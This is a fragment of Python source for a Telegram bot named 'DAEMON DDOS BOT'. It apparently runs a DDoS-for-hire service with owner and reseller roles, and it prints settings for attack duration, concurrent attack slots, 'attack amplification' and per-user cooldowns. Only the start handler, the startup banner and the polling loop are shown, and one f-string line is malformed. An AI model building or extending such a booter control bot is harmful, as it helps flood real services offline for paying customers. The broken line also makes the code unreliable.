                f"🔗 **Join Link:** {CHANNEL_INVITE_LINK}\n\n"
                f"✅ After joining, send /start again to get auto-verified.",
                reply_to=message, parse_mode="Markdown")
            return
    
    # Rest of start command for verified users...
    if is_owner(user_id):
        response = f"👑 Welcome Owner, {HYDRA OWNER}!"
    elif is_reseller(user_id):
        response = f"💼 Welcome Reseller, {user_name}!"
    else:
        response = f"👋 Welcome, {user_name}!\n\n✅ You are verified!\n\nUse /help to see commands."
    
    safe_send_message(message.chat.id, response, reply_to=message, parse_mode="Markdown")
    
    
# ============ BOT START ============
print("=" * 60)
print("🔥 DAEMON DDOS BOT STARTING...")
print("=" * 60)

# Load all data from files
load_all_data()

print(f"🤖 Bot Token: {BOT_TOKEN[:10]}...")
print(f"🎯 API: Custom API (Min {MIN_ATTACK_TIME}s)")
print(f"⚙️ Max Concurrent Slots: {current_max_slots}")
print(f"💪 Attack Amplification: {get_concurrent_limit()}x")
print(f"⏳ Individual Cooldown: {get_user_cooldown_setting()}s")
print("=" * 60)

while True:
    try:
        bot.polling(none_stop=True, interval=0, timeout=20)
    except Exception as e:
        print(f"Error: {e}")
        time.sleep(3)